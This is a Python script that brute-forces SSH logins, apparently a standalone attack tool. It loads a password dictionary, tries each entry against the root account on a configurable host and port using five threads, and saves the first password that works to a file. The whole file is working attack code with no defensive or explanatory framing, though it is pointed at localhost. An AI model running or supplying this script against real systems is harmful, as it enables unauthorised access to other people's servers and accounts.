import queue
import threading
import paramiko

class SSH(threading.Thread):
    def __init__(self, queue, ip, port, username):
        threading.Thread.__init__(self)
        self.queue = queue
        self.ip = ip
        self.port = port
        self.username = username

    def run(self):
        while not self.queue.empty():
            pwd = self.queue.get()
            self.trying(pwd)

    def trying(self, pwd):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.ip, self.port, self.username, pwd.strip("\n"), timeout=5)
            f = open("sshsuc.txt", "w")
            f.write(pwd)
            f.close()
            exit(-1)
        except Exception as e:
            print(e, 'try later')
        ssh.close()

def main():
    Q1 = queue.Queue()
    ip = '127.0.0.1'
    port = 2222
    username = 'root'
    with open("dict.txt", "r") as f:
        for i in f:
            Q1.put(i)
    threads = []
    thread_count = 5
    for i in range(thread_count):
        threads.append(SSH(Q1, ip, port, username))
    for i in threads:
        i.start()
    for i in threads:
        i.join()

if __name__ == "__main__":
    main()
